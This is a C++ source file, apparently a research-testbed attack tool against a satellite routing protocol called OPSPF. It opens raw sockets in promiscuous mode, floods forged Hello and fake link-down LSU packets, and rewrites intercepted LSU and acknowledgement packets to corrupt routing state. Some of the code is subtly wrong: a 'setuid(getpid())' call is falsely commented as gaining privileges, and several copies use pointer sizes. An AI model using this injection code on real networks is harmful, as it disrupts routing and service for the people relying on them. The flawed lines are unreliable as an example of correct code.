#include <unistd.h>
#include <stdio.h>
#include <sys/fcntl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <memory.h>
#include <stdlib.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h> // sockaddr_ll
#include<arpa/inet.h>
#include<netinet/if_ether.h>
#include <net/if.h>
#include<iomanip>

#include <sys/ioctl.h>
#include <cstring>
#include <fstream>
#include <iostream>
#include <pthread.h>
#include <string.h>
#include <cmath>

#include "timer.h"
#include "attack.h"
#include "shell.h"

using namespace std;

OpspfInfData selfInf;

OpspfLsuInfo lsuData;

OpspfLsuackInfo lsuackData;

OpspfHelloInfo helloData;

int satelliteId,satelliteId_opposite,attackMode;

int receive_portId, receive_satelliteId;

int main(int argc,char* argv[])
{
	satelliteId = atoi(argv[1]);
	satelliteId_opposite = atoi(argv[2]);
	initialize(satelliteId);
	attackMode = atoi(argv[3]);
	//attackLinkChange();
	switch(attackMode)
	{
		case SEND_FAKE_HELLO_PACKET:
		{
			Send_FakeHello_Packet();
			break;
		}
		case SEND_FAKE_LSU_PACKET :
		{
			Send_FakeLsu_Packet();
			break;
		}
		default:
		{
			pthread_t recv;
			pthread_create(&recv,NULL,recv_opspf, NULL);
			pthread_join(recv,NULL);
			break;
		}
		
	}
	return 0;
}

void initialize(int satelliteId)
{
	    selfInf =interface_init(satelliteId,0); 
    	selfInf.changeStat = OPSPF_PORT_NOCHANGE; 
    	selfInf.stat = true;   
    	selfInf.ttl = OPSPF_PORT_TTL;   
    	selfInf.lsuAck = false;
}


OpspfInfData interface_init(int satelliteId,int portId)
{
	int sd; 
	int  one = 1;
	const int *val = &one;
	int ret;
	char dev[BUF_STR_SIZE];
	sprintf(dev,"attack%dp%d",satelliteId,portId);
	struct ifreq interface;
	OpspfInfData inf;
	int if_index;
	unsigned char if_mac[6];

	//sd = socket(AF_INET, SOCK_RAW, IPPROTO_OPSPF);
	sd = socket(PF_PACKET, SOCK_RAW, htons(ETHERTYPE_IP));
	//sd = socket(AF_INET,SOCK_DGRAM,0);
	if (sd < 0)
	{
		perror("socket() error");
		// If something wrong just exit
		exit(-1);
	}


	strncpy(interface.ifr_name,dev,sizeof(dev));

	ret = ioctl(sd,SIOCGIFINDEX,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not get index"<<endl;
	}

	ret = ioctl(sd,SIOCGIFHWADDR,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not get HWADDR"<<endl;
	}

	ret = ioctl(sd,SIOCGIFFLAGS,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not do ioctl"<<endl;
	}

	interface.ifr_flags |= IFF_PROMISC;
	ret = ioctl(sd,SIOCSIFFLAGS,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not set to promisc mode"<<endl;
	}

	memcpy(if_mac,interface.ifr_hwaddr.sa_data,sizeof(if_mac));
	memcpy(inf.if_mac ,if_mac,sizeof(if_mac));

	ret = ioctl(sd,SIOCGIFINDEX,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not get index"<<endl;
	}
	if_index = interface.ifr_ifindex;

	struct sockaddr_in addr,netmask;
	ret=ioctl(sd,SIOCGIFADDR,(char*)&interface);
	if(ret<0)
	{
		//cout<<"Can not get IP"<<endl;
	}
	inf.ip = ((struct sockaddr_in *)&interface.ifr_addr)->sin_addr.s_addr;

	//cout<<inf.ip<<endl;

	ret=ioctl(sd,SIOCGIFNETMASK,(char*)&interface);
	if(ret<0)
	{
		//cout<<"Can not get netmask"<<endl;
	}
	 inf.netmask = ((struct sockaddr_in *)&interface.ifr_netmask)->sin_addr.s_addr;

	 inf.sock = sd;
	 inf.if_index = if_index;
	 inf.satelliteId = satelliteId;
	 inf.portId = portId;
	if(setsockopt(sd,SOL_SOCKET,SO_BINDTODEVICE,(char*)&interface,sizeof(struct ifreq))<0)
	{
		//perror("SO_BINDTODEVICE failed");
	}


	// if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(int)))
	// {
	// 	perror("setsockopt() error");
	// 	exit(-1);
	// }
	else
		//printf("setsockopt() is OK.\n");

	 return inf;
}

void OpspfSendProtocolPacket(OpspfInfData inf,OpspfPacketType packetType)
{
	char buffer[PCKT_LEN] ;
	int count = 0;
	struct ethhdr *eth_header = (struct ethhdr *)buffer;
	struct iphdr *ip = (struct iphdr *) (buffer+sizeof(struct ethhdr));
	OPSPF_Header* opspf_header =(OPSPF_Header*)(buffer +sizeof(struct ethhdr)+ sizeof(struct iphdr));

	//缓存清零
	memset(buffer, 0, PCKT_LEN);

	switch(packetType)
	{
		case OPSPF_HELLO_PACKET:
		{		
			opspf_header->packetType = OPSPF_HELLO_PACKET;
			opspf_header->pktlen = sizeof(OPSPF_Header)+sizeof(OpspfHelloInfo);
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr) ,opspf_header , sizeof(OPSPF_Header));

			OpspfHelloInfo* helloInfo = (OpspfHelloInfo*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
			helloInfo->satelliteId = inf.satelliteId;
			helloInfo->portId =inf.portId;
			//cout<<"Send_Hello_Packet satelliteId"+ to_string(helloInfo->satelliteId) +" portId" +to_string(helloInfo->portId)<<endl;

			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr)+sizeof(OPSPF_Header),helloInfo, sizeof(OpspfHelloInfo));
			break;
		}
		case OPSPF_LSU_PACKET:
		{
			opspf_header->packetType = OPSPF_LSU_PACKET;
			opspf_header->pktlen = sizeof(OPSPF_Header)+sizeof(OpspfLsuInfo);
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr) ,opspf_header , sizeof(OPSPF_Header));

			OpspfLsuInfo* lsuInfo = (OpspfLsuInfo*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
			*lsuInfo  = lsuData;
			//cout<<"Send_Lsu_Packet satelliteId"+ to_string(lsuInfo->srcSatelliteId) +" portId" +to_string(lsuInfo->srcPortId)<<endl;

			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr)+sizeof(OPSPF_Header),lsuInfo , sizeof(lsuInfo));
			break;
		}
		case OPSPF_LSACK_PACKET:
		{
			opspf_header->packetType = OPSPF_LSACK_PACKET;
			opspf_header->pktlen = sizeof(OPSPF_Header)+sizeof(OpspfLsuackInfo);
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr) ,opspf_header , sizeof(OPSPF_Header));

			OpspfLsuackInfo* lsuackInfo = (OpspfLsuackInfo*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
			
			*lsuackInfo = lsuackData;
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr)+sizeof(OPSPF_Header),lsuackInfo , sizeof(lsuackInfo));
			break;
		}
		default:
		{
			cout<<"Unknown protocol packet type to send!"<<endl;
			break;
		}
	}

	struct sockaddr_in sin, din;
	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	sin.sin_addr.s_addr = inf.ip;
	din.sin_addr.s_addr = inf.ip;

 
	// Fabricate the IP header or we can use the
	// standard header structures but assign our own values.
	ip->ihl = COMMON_IPHDR_LEN;
	ip->version = IP_VERSION;//报头长度，4*32=128bit=16B
	ip->tos = DEFAULT_OPSPF_TOS; // 服务类型
	ip->tot_len = (sizeof(struct iphdr) + opspf_header->pktlen);
	//ip->id = htons(54321);//可以不写
	ip->ttl = DEFAULT_OPSPF_TTL; // hops生存周期
	ip->protocol = IPPROTO_OPSPF; // OPSPF
	ip->check = 0;

	ip->saddr = sin.sin_addr.s_addr;
	ip->daddr = din.sin_addr.s_addr;

	struct sockaddr_ll dstmac;
	memset(&dstmac,0,sizeof(dstmac));
	dstmac.sll_family = AF_PACKET;
	dstmac.sll_ifindex = inf.if_index;
	dstmac.sll_halen = htons(ETH_HLEN);
	memcpy(dstmac.sll_addr,inf.if_mac,dstmac.sll_halen);
	memcpy(eth_header->h_dest , inf.if_mac,ETH_ALEN);
 
	setuid(getpid());//如果不是root用户，需要获取权限	
		
	if (sendto(inf.sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&dstmac, sizeof(dstmac)) < 0)
		// Verify
	//if (sendto(inf.sock, buffer, ip->tot_len, 0, (struct sockaddr *)&din, sizeof(din)) < 0)	
	{
		perror("sendto() error");
	}	
		//close(inf.sock);
}

void *recv_opspf(void *ptr)
{
	int sockfd;
	struct iphdr *ip;
	struct ethhdr *eth_header;
	char buf[2048];
	ssize_t n;
	int interfaceIndex;

	if ((sockfd = socket(PF_PACKET,  SOCK_RAW, htons(ETH_P_ALL)))== -1)
	{    
	    printf("socket error!\n");
	}

	while(1)
	{
		 n = recv(sockfd, buf, sizeof(buf), 0);
	    if (n == -1)
	    {
	        printf("recv error!\n");
	        break;
	    }
	    else if (n==0)
	        continue;
	    eth_header = (struct ethhdr*)(buf);
	    ip = ( struct iphdr *)(buf+sizeof(ethhdr));
	    // route_test();
	    if(ip->protocol != IPPROTO_OPSPF )
	    {
	    	continue;
	    }

        if (ip->protocol == IPPROTO_OPSPF && ip->saddr !=selfInf.ip)
        {
            OPSPF_Header *opspfhdr = (OPSPF_Header *)(buf +sizeof(ethhdr)+sizeof(struct iphdr));
            //analyseOPSPF(opspfhdr);
            switch(opspfhdr->packetType)
            {
                case OPSPF_HELLO_PACKET:
                  {
                    OpspfHelloInfo *helloInfo =(OpspfHelloInfo*)(buf +sizeof(ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
                    Opspf_Handle_HelloPacket(helloInfo);
                    break;
                  }
                case OPSPF_LSU_PACKET:
                {
                    OpspfLsuInfo *lsuInfo =(OpspfLsuInfo*)(buf +sizeof(ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
                    receive_satelliteId = lsuInfo->satelliteId;
                    receive_portId = lsuInfo->portId;
                    cout<<"receive_LSU_packet"<<endl;
                    if(attackMode == MODIFY_LSU_PACKET)
                    {
                    	Opspf_Modify_LsuPacket(lsuInfo);
                    }
                    else if(attackMode == SEND_FAKE_LSACK_PACKET)
                    {
                    	Send_FakeLsack_Packet();
                    }
                    break; 
                }
                case OPSPF_LSACK_PACKET:
                {
                	OpspfLsuackInfo *lsuackInfo =(OpspfLsuackInfo*)(buf +sizeof(ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
                    Opspf_Modify_LsuackPacket(lsuackInfo);
                    break; 
                }

                default:
                    break;
            }
        }  
 			  
	}
	close(sockfd);
    
}

void analyseIP(struct iphdr *ip)
{
    unsigned char* p = (unsigned char*)&ip->saddr;
    printf("Source IP\t: %u.%u.%u.%u\n",p[0],p[1],p[2],p[3]);
}

void Opspf_Handle_HelloPacket(const OpspfHelloInfo* helloInfo)
{

   cout<<"HelloPacket"+to_string(helloInfo->satelliteId)+ to_string(helloInfo->portId)<<endl;
   
   OpspfSendProtocolPacket(selfInf,OPSPF_HELLO_PACKET);

}

void Opspf_Modify_LsuPacket(const OpspfLsuInfo* lsuInfo)
{
    
    int srcSatelliteId = lsuInfo->srcSatelliteId;
    int srcPortId = lsuInfo->srcPortId;
    int dstSatelliteId = lsuInfo->dstSatelliteId;
    int dstPortId = lsuInfo->dstPortId;
    int stat =lsuInfo->changeStat;
	cout<<"LsuPacket"+to_string(srcSatelliteId)+to_string(srcPortId)<<endl;


    receive_satelliteId = lsuInfo->satelliteId;
    receive_portId = lsuInfo->portId;

    lsuData.satelliteId = satelliteId;
    lsuData.portId = lsuInfo->portId;
    lsuData.srcSatelliteId = srcSatelliteId + 1;
    lsuData.srcPortId = srcPortId ;
    lsuData.dstSatelliteId = dstSatelliteId + 1;
    lsuData.dstPortId = dstPortId;
    lsuData.changeStat = lsuInfo->changeStat;
    cout<<"modify_lsu_send"<<endl;
    OpspfSendProtocolPacket(selfInf,OPSPF_LSU_PACKET);

}

void Opspf_Modify_LsuackPacket(const OpspfLsuackInfo* lsuackInfo)
{
    cout<<"ACKPacket"+to_string(lsuackInfo->receive_satelliteId)+to_string(lsuackInfo->receive_portId)<<endl;
	lsuackData.receive_satelliteId = receive_satelliteId + 1;
	lsuackData.receive_portId = receive_portId + 1;
	OpspfSendProtocolPacket(selfInf,OPSPF_LSACK_PACKET);
   
}

void Send_FakeHello_Packet()
{
	for(int i = 0; i<2000; i++)
	{
		OpspfSendProtocolPacket(selfInf,OPSPF_HELLO_PACKET);
		sleep(OPSPF_HELLO_INTERVAL);
	}

}

void Send_FakeLsu_Packet()
{
	lsuData.satelliteId = satelliteId;
    lsuData.portId = 1;
    lsuData.srcSatelliteId = 3;
    lsuData.srcPortId = 1;
    lsuData.dstSatelliteId = 4;
    lsuData.dstPortId = 0;
    lsuData.changeStat = OPSPF_PORT_LINKDOWN;
	for (int i = 0; i < 2000; ++i)
	{
		  OpspfSendProtocolPacket(selfInf,OPSPF_LSU_PACKET);
		  sleep(OPSPF_LSU_INTERVAL);
	}

}

void Send_FakeLsack_Packet()
{
	lsuackData.receive_satelliteId = receive_satelliteId;
	lsuackData.receive_portId = receive_portId;
	for (int i = 0; i < 2000; ++i)
	{
		  OpspfSendProtocolPacket(selfInf,OPSPF_LSACK_PACKET);
		  sleep(OPSPF_HELLO_INTERVAL);
	}

}
